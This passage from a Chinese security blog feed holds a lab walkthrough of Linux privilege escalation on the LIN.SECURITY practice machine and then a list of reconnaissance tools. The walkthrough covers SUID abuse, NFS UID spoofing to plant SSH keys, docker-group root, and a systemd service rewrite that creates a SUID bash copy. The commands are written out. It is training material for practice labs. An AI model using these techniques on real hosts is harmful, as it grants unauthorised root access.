src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221174037.png" alt></p><p>查看该文件，是susan用户的密码：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221174144.png" alt></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221174234.png" alt></p><h2 id="5-利用SUID"><a href="#5-利用SUID" class="headerlink" title="5. 利用SUID"></a>5. 利用SUID</h2><p>SUID这个是<code>uid +s</code>的组合，s指的是<strong>特殊权限</strong>。一般情况下，用户的权限是3位，比如<code>0755</code>这样的，<strong>特殊权限默认没有配置</strong>，但是如果超级管理员<strong>希望用户在执行一些特殊权限文件时，拥有root的权限</strong>，就会配置特殊权限。</p><p>比如说<code>passwd</code>这个命令，这个命令会修改<code>/etc/shadow</code>文件，而<code>/etc/shadow</code><strong>只有root才能修改</strong>，本来passwd这个命令应该也只能root才能执行的。但是<strong>系统为了让普通用户能够修改自己的密码</strong>，对<code>passwd</code>这个命令<strong>赋予了特殊权限</strong>并添加了只能修改自己密码的限制。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003056.png" alt></p><p>由于<code>passwd</code>这个命令是<strong>做过限制</strong>的，所以<strong>赋予特殊权限是没有问题</strong>的，但是如果系统超级用户特殊权限乱用，就会导致提权的问题。</p><p><strong>使用如下命令快速查找所有SUID文件</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -type f -exec ls -la &#123;&#125; 2&gt;/dev/null \;</span><br></pre></td></tr></table></figure><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003224.png" alt></p><p>命令文件，<code>xxd</code>的作用是<strong>将一个文件以16进制的形式显示出来</strong>。他<strong>被配置了特殊权限</strong>，并且用户组为<code>itservices</code>是拥有执行权限x的。</p><p>一旦<strong>suid</strong>和<strong>执行权限</strong>在一起就可能导致权限提升！</p><p>通过命令查看发现<code>susan</code>这个用户属于<code>itservices</code>这个用户组。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003500.png" alt></p><p>用它来查看<code>/etc/shadow</code>这个文件，更多利用方法可以参考<a href="https://gtfobins.github.io/gtfobins/xxd/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/xxd/</a></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003704.png" alt></p><p>还发现了一个<strong>其他用户拥有执行权限</strong>的SUID文件，这个文件<strong>不限用户</strong>，所以危害更大。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003834.png" alt></p><p>参考<a href="https://gtfobins.github.io/gtfobins/taskset/#suid-enabled" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/taskset/#suid-enabled</a></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222003953.png" alt></p><h2 id="6-NFS低权限访问"><a href="#6-NFS低权限访问" class="headerlink" title="6. NFS低权限访问"></a>6. NFS低权限访问</h2><p>用<code>nmap</code>扫一下目标靶机，看看开放的服务：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222120320.png" alt></p><p>看到开放<code>2049</code>端口，对应<code>nfs</code>服务。</p><p>NFS(<code>Network File System</code>)即<strong>网络文件系统</strong>，它<strong>允许网络中的计算机之间通过TCP/IP网络共享资源</strong>。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。</p><p>在kali上<strong>安装nfs客户端工具</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nfs-common</span><br></pre></td></tr></table></figure><p>安装完之后，可以使用<code>showmount</code>命令检索<strong>给定主机的导出文件夹列表</strong>。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222143147.png" alt></p><p>账号peter的家目录可以被挂载：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222143216.png" alt></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222143235.png" alt></p><p>可以看到，挂载好的peter的家目录，显示的文件的<strong>所有者</strong>和<strong>所属组</strong>分别为<code>1001</code>和<code>1005</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222143654.png" alt></p><p>尝试在这个家目录里面<strong>创建一个文件</strong>：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222143950.png" alt></p><p>权限不够。</p><p>即使我们在kali攻击机上是root用户，但是我们还是没有写入权限，因为<strong>默认情况下客户端的root身份会被主动压缩成匿名者</strong>。</p><p><strong>可以伪造文件所有者的UID和GID来欺骗NFS服务器</strong>，创建一个gid为1005的用户组，接着创建peter这个账户uid指定为1001，gid指定为1005。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222144218.png" alt></p><p>再看看<code>/mnt/peter</code>下的文件所有者：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222144321.png" alt></p><p>但现在还是以客户端的root登录，服务端默认为匿名者。</p><p>切换客户端用户为<code>peter</code>，服务端也认为是存在的用户<code>peter</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222144513.png" alt></p><p>可以写文件了，如此，可以<strong>写入ssh公钥文件</strong>（先使用<code>ssh-keygen</code>生成公私钥对）：</p><p>首先创建服务器上的<code>.ssh</code>目录，写入公钥：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222144739.png" alt></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222145125.png" alt></p><p>使用私钥登录：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222145227.png" alt></p><h2 id="7-利用docker组提权"><a href="#7-利用docker组提权" class="headerlink" title="7. 利用docker组提权"></a>7. 利用docker组提权</h2><p>从上面那张图，看到<code>peter用户</code>也属于<code>docker组</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222150634.png" alt></p><p>如果是docker组的成员，那么可以根据此漏洞来<strong>获取root的shell</strong></p><p>具体参考：<a href="https://fosterelli.co/privilege-escalation-via-docker.html" target="_blank" rel="noopener">https://fosterelli.co/privilege-escalation-via-docker.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></pre></td></tr></table></figure><p>可以先配置使用阿里云的镜像</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222151859.png" alt></p><p>镜像的具体代码可以查看：<a href="https://github.com/chrisfosterelli/dockerrootplease" target="_blank" rel="noopener">https://github.com/chrisfosterelli/dockerrootplease</a></p><h2 id="8-systemd配置"><a href="#8-systemd配置" class="headerlink" title="8. systemd配置"></a>8. systemd配置</h2><h3 id="systemd是什么"><a href="#systemd是什么" class="headerlink" title="systemd是什么"></a>systemd是什么</h3><p>历史上，<a href="http://www.ruanyifeng.com/blog/2013/08/linux_boot_process.html" target="_blank" rel="noopener">Linux 的启动</a>一直采用<a href="https://en.wikipedia.org/wiki/Init" target="_blank" rel="noopener"><code>init</code></a>进程。</p><p>下面的命令用来启动服务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo /etc/init.d/apache2 start</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ service apache2 start</span><br></pre></td></tr></table></figure><p>这种方法有两个缺点。</p><p>一是启动时间长。<code>init</code>进程是串行启动，只有前一个进程启动完，才会启动下一个进程。</p><p>二是启动脚本复杂。<code>init</code>进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使得脚本变得很长。</p><p>Systemd 就是为了解决这些问题而诞生的。它的设计目标是，<strong>为系统的启动和管理提供一套完整的解决方案</strong>。</p><p>使用了 <code>Systemd</code>，就不需要再用<code>init</code>了。<code>Systemd</code> 取代了<code>initd</code>，成为系统的第一个进程（PID 等于 1），其他进程都是它的子进程。</p><p>Systemd 并不是一个命令，而是<strong>一组命令</strong>，涉及到<strong>系统管理的方方面面</strong>。</p><ul><li><p><code>systemctl</code>是 Systemd 的主命令，用于管理系统。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重启系统</span></span><br><span class="line">$ sudo systemctl reboot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭系统，切断电源</span></span><br><span class="line">$ sudo systemctl poweroff</span><br></pre></td></tr></table></figure></li><li><p><code>systemd-analyze</code>命令用于查看启动耗时。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看启动耗时</span></span><br><span class="line">$ systemd-analyze                                                                     </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看每个服务的启动耗时</span></span><br><span class="line">$ systemd-analyze blame</span><br></pre></td></tr></table></figure></li><li><p><code>hostnamectl</code>命令用于查看当前主机的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示当前主机的信息</span></span><br><span class="line">$ hostnamectl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置主机名。</span></span><br><span class="line">$ sudo hostnamectl <span class="built_in">set</span>-hostname rhel7</span><br></pre></td></tr></table></figure></li></ul><h3 id="靶机提权演示-1"><a href="#靶机提权演示-1" class="headerlink" title="靶机提权演示"></a>靶机提权演示</h3><p>查看<code>peter</code>用户的<code>systemd</code>配置，发现<code>peter</code>这个用户拥有<code>debug.service</code>文件，并且他<strong>对这个文件拥有读和写的权限</strong>。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222154157.png" alt></p><p>如果服务器存在缺陷，<strong>可以被覆盖或者修改文件</strong>，可以通过<strong>修改低权限用户有权访问的<code>.service</code>文件并更改<code>run()</code>命令来将其转换为代码执行</strong>。重新启动服务时，将运行攻击者的命令。</p><p>查看<code>.service</code>文件，这里我们可以修改<code>ExecStart</code>文件，除此之外还可以修改<code>ExecStop</code>和<code>ExecReload</code>来在<strong>停止</strong>和<strong>重启</strong>服务时执行命令。</p><p>查看该<code>.service</code>文件：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222155806.png" alt></p><p><code>ExecStart</code>为<code>/root/debug</code>，这是一个<strong>二进制服务</strong>并且该服务<strong>以root身份运行</strong>。</p><p>接下来为了利用，使用一个<strong>类似ssh可以sudo执行的方法</strong>。</p><p><strong>让root身份来创建一个systemdexpl.sh脚本</strong>，将<code>/bin/bash</code>文件<strong>复制到</strong><code>systemdbash</code><strong>并设置一个SUID位</strong>并且赋予执行权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">'#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755 /home/peter/systemdbash'</span> &gt; /home/peter/systemdexpl.sh &amp;&amp; chmod +x systemdexpl.sh</span><br></pre></td></tr></table></figure><p><code>-e</code>参数为显示换行。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222160028.png" alt></p><p>修改<code>debug.service</code>文件来调用我们的脚本（记住<strong>root调用debug.service</strong>，而<strong>debug.service又调用我们的systemdexpl.sh脚本</strong>）修改<code>ExecStart</code>为当前脚本。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222160305.png" alt></p><p>而要调用这个服务并且启动，就是<strong>重新开启会话（可能重启系统）</strong>，<strong>利用SUID来进行提权</strong>。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222160857.png" alt></p><p>利用<code>SUID</code>提权：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222161005.png" alt></p><p>同理，<strong>root调用debug.service</strong>，而<strong>debug.service又调用我们的systemdexpl.sh脚本</strong>，我们可以将<code>systemdexpl.sh</code>的内容修改为将公钥写入<code>/root/.ssh</code>下：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222162107.png" alt></p><p>直接以<code>root</code>用户登录：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222162207.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 提权知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LIN.SECURITY </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息搜集总结</title>
      <link href="/passages/2020-02-12-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%BB%E7%BB%93/"/>
      <url>/passages/2020-02-12-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>记录个人常用的信息搜集工具</p></blockquote><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200213224011.jpg" alt></p><a id="more"></a><h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><h3 id="whois是什么"><a href="#whois是什么" class="headerlink" title="whois是什么"></a>whois是什么</h3><p>whois是一种<code>传输协议</code>，<strong>whois查询是一个数据库</strong>。域名查询可以快速了解一家网站的运营者是谁。</p><h3 id="whois可以查询什么信息"><a href="#whois可以查询什么信息" class="headerlink" title="whois可以查询什么信息"></a>whois可以查询什么信息</h3><ol><li>注册信息中的域名所有者的邮箱和名字，域名注册时间，过期时间，注册中心以及当前注册状态</li><li>管理员各种联系信息,包括管理员邮箱，电话，传真，各种名字[可以用来制作字典]</li><li>目标技术的联系方式,包括邮箱，电话，传真，名称</li><li>用于解析该域名的所有ns服务器</li></ol><h3 id="在线查询网站"><a href="#在线查询网站" class="headerlink" title="在线查询网站"></a>在线查询网站</h3><h4 id="bugscaner-whois"><a href="#bugscaner-whois" class="headerlink" title="bugscaner-whois"></a>bugscaner-whois</h4><p><a href="http://whois.bugscaner.com/" target="_blank" rel="noopener">http://whois.bugscaner.com/</a></p><p>界面很喜欢</p><p>同时bugscaner上还包括很多工具：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211161001.png" alt></p><h4 id="阿里"><a href="#阿里" class="headerlink" title="阿里"></a>阿里</h4><p><a href="https://whois.aliyun.com/" target="_blank" rel="noopener">https://whois.aliyun.com/</a></p><h4 id="全球查"><a href="#全球查" class="headerlink" title="全球查"></a>全球查</h4><p><a href="https://www.whois365.com/cn/" target="_blank" rel="noopener">https://www.whois365.com/cn/</a></p><h4 id="爱站"><a href="#爱站" class="headerlink" title="爱站"></a>爱站</h4><p><a href="https://whois.aizhan.com/" target="_blank" rel="noopener">https://whois.aizhan.com/</a></p><h4 id="站长"><a href="#站长" class="headerlink" title="站长"></a>站长</h4><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a></p><h4 id="kali自带工具"><a href="#kali自带工具" class="headerlink" title="kali自带工具"></a>kali自带工具</h4><p>结合使用，有些在线网站会屏蔽查询某个域名。</p><h2 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h2><p>备案信息可以查询<code>注册人姓名</code>等信息。</p><h3 id="在线查询网站-1"><a href="#在线查询网站-1" class="headerlink" title="在线查询网站"></a>在线查询网站</h3><h4 id="ICP备案查询网"><a href="#ICP备案查询网" class="headerlink" title="ICP备案查询网"></a>ICP备案查询网</h4><p><a href="http://beianbeian.com/" target="_blank" rel="noopener">http://beianbeian.com/</a></p><h4 id="天眼查"><a href="#天眼查" class="headerlink" title="天眼查"></a>天眼查</h4><p><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a>  查公司、查老板</p><h4 id="工信部"><a href="#工信部" class="headerlink" title="工信部"></a>工信部</h4><p><a href="http://beian.miit.gov.cn/state/outPortal/loginPortal.action" target="_blank" rel="noopener">http://beian.miit.gov.cn/state/outPortal/loginPortal.action</a></p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><h3 id="在线查询网站-2"><a href="#在线查询网站-2" class="headerlink" title="在线查询网站"></a>在线查询网站</h3><h4 id="云悉资产"><a href="#云悉资产" class="headerlink" title="云悉资产"></a>云悉资产</h4><p><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></p><h4 id="在线二级域名子域名查询"><a href="#在线二级域名子域名查询" class="headerlink" title="在线二级域名子域名查询"></a>在线二级域名子域名查询</h4><p><a href="http://tools.bugscaner.com/subdomain/" target="_blank" rel="noopener">http://tools.bugscaner.com/subdomain/</a></p><h4 id="在线子域名爆破"><a href="#在线子域名爆破" class="headerlink" title="在线子域名爆破"></a>在线子域名爆破</h4><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211142030.png" alt></p><h4 id="DNSdumpster"><a href="#DNSdumpster" class="headerlink" title="DNSdumpster"></a>DNSdumpster</h4><p><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></p><p>演示结果</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211144726.png" alt></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211144602.png" alt></p><h4 id="通过证书查找子域名（Crt-sh）"><a href="#通过证书查找子域名（Crt-sh）" class="headerlink" title="通过证书查找子域名（Crt.sh）"></a>通过证书查找子域名（Crt.sh）</h4><p><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211145107.png" alt></p><h4 id="通过证书查找子域名（censys）"><a href="#通过证书查找子域名（censys）" class="headerlink" title="通过证书查找子域名（censys）"></a>通过证书查找子域名（censys）</h4><p><a href="https://censys.io" target="_blank" rel="noopener">https://censys.io</a></p><p>查找子域名这方面比较鸡肋：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211142236.png" alt></p><p>会查到<code>www.chongqing-baidu.com</code>这种无用的网站</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211142342.png" alt></p><p>菠菜而已。</p><h4 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h4><p><code>site:zhihu.com</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211145305.png" alt></p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="Layer子域名挖掘机"><a href="#Layer子域名挖掘机" class="headerlink" title="Layer子域名挖掘机"></a>Layer子域名挖掘机</h4><p>字典要大</p><h4 id="Sublist3r"><a href="#Sublist3r" class="headerlink" title="Sublist3r"></a>Sublist3r</h4><p><strong>开源工具</strong>。它可以从<strong>多个源</strong>中获取查询的输出结果，如google，bing，virustotal，crt.sh等，虽然绝大多数情况下它所返回的数据都是正确的，但也有可能会遇到一些无法解析的子域名</p><p>Sublist3r还使用了一个名叫<strong>subbrute</strong>的独立项目，而Subbrute使用了一个常用子域名字典，并通过这个字典来找出可以正常解析的子域名集合 </p><ul><li>－d：枚举指定域名的子域名 </li><li>－b：使用subbrute模块 </li><li>－v：实时列举搜索结果 </li><li>－t：设置使用subbrute暴力破解的线程数 </li><li>－o：将结果保存为文本文件 </li><li>－h：帮助</li></ul><p>在我的主机上使用<code>python2</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211154319.png" alt></p><p>还可以同时使用暴力破解模块：</p><p><code>python sublist3r.py -b -d zhihu.com</code></p><h2 id="Web指纹查询"><a href="#Web指纹查询" class="headerlink" title="Web指纹查询"></a>Web指纹查询</h2><p>Web指纹简介：</p><p><img src="https://pic2.zhimg.com/80/133c88180340b844466e8fa5552e122b_hd.jpg" alt></p><h3 id="在线查询网站-3"><a href="#在线查询网站-3" class="headerlink" title="在线查询网站"></a>在线查询网站</h3><h4 id="云悉指纹"><a href="#云悉指纹" class="headerlink" title="云悉指纹"></a>云悉指纹</h4><p><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></p><h4 id="在线CMS指纹识别"><a href="#在线CMS指纹识别" class="headerlink" title="在线CMS指纹识别"></a>在线CMS指纹识别</h4><p><a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/</a></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211155546.png" alt></p><h4 id="火狐插件-Wappalyzer"><a href="#火狐插件-Wappalyzer" class="headerlink" title="火狐插件-Wappalyzer"></a>火狐插件-Wappalyzer</h4><p>识别出来的比较简单</p><h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3><h4 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h4><p>kali集成</p><p>推荐使用<code>-v</code>参数：<code>whatweb -v aliyun.bugscaner.com</code>  更详细并且格式化。</p><h2 id="端口指纹搜集"><a href="#端口指纹搜集" class="headerlink" title="端口指纹搜集"></a>端口指纹搜集</h2><h3 id="在线查询网站-4"><a href="#在线查询网站-4" class="headerlink" title="在线查询网站"></a>在线查询网站</h3><h4 id="在线端口检测"><a href="#在线端口检测" class="headerlink" title="在线端口检测"></a>在线端口检测</h4><p><a href="http://coolaf.com/tool/port" target="_blank" rel="noopener">http://coolaf.com/tool/port</a></p><h4 id="在线端口扫描"><a href="#在线端口扫描" class="headerlink" title="在线端口扫描"></a>在线端口扫描</h4><p><a href="https://www.ip33.com/port_scan.html" target="_blank" rel="noopener">https://www.ip33.com/port_scan.html</a></p><p><a href="http://duankou.wlphp.com/" target="_blank" rel="noopener">http://duankou.wlphp.com/</a></p><p><a href="http://www.nicetool.net/app/port_scan.html" target="_blank" rel="noopener">http://www.nicetool.net/app/port_scan.html</a></p><h3 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h3><h4 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h4><ul><li><code>-p</code> 指定扫描的端口：<code>-p80,8080-8100</code></li><li><code>--rate</code> 指定发包的速率：<code>--rate 100000</code></li></ul><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><ul><li><p><code>-sS</code> 执行一次隐秘的TCP扫描</p></li><li><p><code>-Pn</code> 会告诉nmap不要使用ping命令预先判断主机是否存活，而是默认所有主机都是存活状态</p></li><li><p><code>-A</code> 参数会显示更详细的信息，同时扫描的时间也会更长</p></li><li><p><code>-p</code> 参数指定端口：<code>-p1-65535</code>、<code>-p20-200,7777,8888</code></p></li></ul><p><code>nmap -sS -Pn -A -p20-200,7777 192.168.91.132</code></p><h3 id="常见端口漏洞"><a href="#常见端口漏洞" class="headerlink" title="常见端口漏洞"></a>常见端口漏洞</h3><p><a href="https://github.com/BestBDs/port-bug/blob/master/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">https://github.com/BestBDs/port-bug/blob/master/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E</a></p><h2 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h2><h3 id="工具-3"><a href="#工具-3" class="headerlink" title="工具"></a>工具</h3><p>主要看字典大小</p><h4 id="御剑"><a href="#御剑" class="headerlink" title="御剑"></a>御剑</h4><h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p><h2 id="敏感信息-网络空间资产搜索"><a href="#敏感信息-网络空间资产搜索" class="headerlink" title="敏感信息-网络空间资产搜索"></a>敏感信息-网络空间资产搜索</h2><h3 id="Google-hacking语法"><a href="#Google-hacking语法" class="headerlink" title="Google hacking语法"></a>Google hacking语法</h3><ul><li><code>site</code>：指定域名</li><li><code>inurl</code>：指定url中存在的关键字</li><li><code>intext</code>：指定网页正文中的关键字</li><li><code>filetype</code>：指定文件类型</li><li><code>intitle</code>：指定网页标题中的关键字</li><li><code>link</code>：返回所有和link做了链接的url</li><li><code>info</code>：查找指定站点的一些基本信息</li><li><code>cache</code>：搜索Google里关于某些内容的缓存</li></ul><p><strong>谷歌漏洞库</strong>：<a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database</a></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200212155216.png" alt></p><h3 id="GitHub上的敏感信息"><a href="#GitHub上的敏感信息" class="headerlink" title="GitHub上的敏感信息"></a>GitHub上的敏感信息</h3><p><code>仓库搜索</code>、<code>代码搜索</code>、<code>问题搜索</code>、<code>用户名搜索</code>的结果分别在以下框框中。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200212170222.png" alt></p><h4 id="（1）-基本搜索（Basic-search）"><a href="#（1）-基本搜索（Basic-search）" class="headerlink" title="（1） 基本搜索（Basic search）"></a>（1） 基本搜索（Basic search）</h4><ul><li>查找stars数超过100的有关”cat”仓库：<code>cat stars:&gt;100</code></li><li>搜索用户名为<code>fengbingchun</code>的<strong>所有仓库</strong>：<code>user:fengbingchun</code></li><li>搜索地址在”San Francisco, CA”的<strong>用户名</strong>包含tom的所有仓库：<code>tom location:&quot;San Francisco, CA&quot;</code>（<strong>搜用户</strong>）</li><li>搜索不包含关于”cat”的所有仓库：<code>NOT cat</code></li></ul><h4 id="（2）-仓库搜索（Repository-search）"><a href="#（2）-仓库搜索（Repository-search）" class="headerlink" title="（2） 仓库搜索（Repository search）"></a>（2） 仓库搜索（Repository search）</h4><ul><li>搜索有关”node.js”并fork数少于200的所有仓库：<code>node.js forks:&lt;200</code></li><li>搜索有关”jquery”并<strong>大小</strong>在1024至4089KB之间的所有仓库：<code>jquery size:1024..4089</code></li><li>搜索用户名为fengbingchun并且开发语言为C++的所有仓库：<code>language:c++ user:fengbingchun</code></li><li>搜索用户名为fengbingchun并且followers数大于等于10的所有仓库：<code>user:fengbingchun followers:&gt;=10</code></li><li>搜索用户名为fengbingchun并且<strong>仓库在2019年1月1日后有更新</strong>（<strong>pushed</strong>）的所有仓库：<code>user:fengbingchun pushed:&gt;2019-01-01</code></li></ul><h4 id="（3）-代码搜索（Code-search）"><a href="#（3）-代码搜索（Code-search）" class="headerlink" title="（3） 代码搜索（Code search）"></a>（3） 代码搜索（Code search）</h4><ul><li>搜索用户名为fengbingchun并且<strong>文件中含有”cv::Mat”</strong>的<strong>所有文件</strong>：<code>cv::Mat user:fengbingchun</code></li><li>搜索文件大小大于1000KB并文件中包含”system”的所有文件：<code>system size:&gt;1000</code></li><li>搜索<strong>在/docs/路径下</strong>文件中<strong>含有”examples”的所有文件</strong>：<code>examples path:/docs/</code></li></ul><h4 id="（4）-问题搜索（Issue-search）"><a href="#（4）-问题搜索（Issue-search）" class="headerlink" title="（4） 问题搜索（Issue search）"></a>（4） 问题搜索（Issue search）</h4><ul><li>搜索用户名为fengbingchun并<strong>issue中含有”opencv”字段</strong>的所有issues：<code>opencv user:fengbingchun</code></li><li>搜索<strong>issue是open状态</strong>并且issue中含有”fengbingchun”字段的所有issues：<code>fengbingchun is:open</code></li><li>搜索issue中<strong>comments数大于4次</strong>且含有”fengbingchun”字段的所有issues：<code>fengbingchun comments:&gt;4</code></li><li>搜索<strong>issue创建者</strong>是fengbingchun的所有issues：<code>author:fengbingchun</code></li><li>搜索<strong>issue在2019年2月15日后创建</strong>的且含有”opencv”字段的所有issues：<code>opencv created:&gt;2019-03-15</code></li></ul><h4 id="（5）-用户名搜索（User-search）"><a href="#（5）-用户名搜索（User-search）" class="headerlink" title="（5） 用户名搜索（User search）"></a>（5） 用户名搜索（User search）</h4><ul><li>搜索<strong>用户全名</strong>为”Bingchun Feng”的用户：<code>fullname:&quot;Bingchun Feng&quot;</code></li></ul><h4 id="（6）-高级搜索（Advanced-search）"><a href="#（6）-高级搜索（Advanced-search）" class="headerlink" title="（6） 高级搜索（Advanced search）"></a>（6） 高级搜索（Advanced search）</h4><p><a href="https://github.com/search/advanced" target="_blank" 